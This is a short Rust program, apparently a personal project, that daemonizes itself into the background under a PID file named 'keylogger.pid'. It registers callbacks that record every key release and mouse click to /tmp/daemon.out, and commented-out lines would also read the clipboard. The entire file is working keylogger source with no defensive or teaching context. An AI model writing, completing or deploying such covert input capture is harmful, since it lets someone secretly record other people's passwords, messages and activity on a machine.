extern crate daemonize;
extern crate device_query;
//use cli_clipboard::{ClipboardContext, ClipboardProvider}
use device_query::{DeviceEvents, DeviceState};
use std::fs::File;
use daemonize::Daemonize;
use std::{thread, time};
use std::time::Duration;


fn main() {
    //let mut ctx = ClipboardContext::new().unwrap();
    //let data = ctx.get_contents().unwrap();
    //println!("data => {:?}",data);

//let mut device_state = DeviceState::new();
//let mouse: MouseState = device_state.get_mouse();
//println!("Current Mouse Coordinates: {:?}", mouse.coords);    

    let device_state = DeviceState::new();
    let stdout = File::create("/tmp/daemon.out").unwrap();
    let stderr = File::create("/tmp/daemon.err").unwrap();

    let daemonize = Daemonize::new()
        .pid_file("/tmp/keylogger.pid") // Every method except `new` and `start`
        .working_directory("/tmp") // for default behaviour.
        .stdout(stdout)  // Redirect stdout to `/tmp/daemon.out`.
        .stderr(stderr)  // Redirect stderr to `/tmp/daemon.err`.
        .privileged_action(|| "Executed before drop privileges");
    match daemonize.start() {
        Ok(_) => {
            println!("Success, daemonized");
        let _data = device_state.on_key_up(|key|{
                              println!("-> key :: {:#?}",key);
                            });
        let _data_ = device_state.on_mouse_up(|mouse|{
                              println!("-> mouse :: {:#?}",mouse);
                            });
            loop {
                // let keys = device_state.get_keys();
                // println!("keys => {:#?}",keys);
                thread::sleep(Duration::from_secs(1));
            }
    },
        Err(e) => eprintln!("Error, {}", e),
    }

    println!("end of process");
}
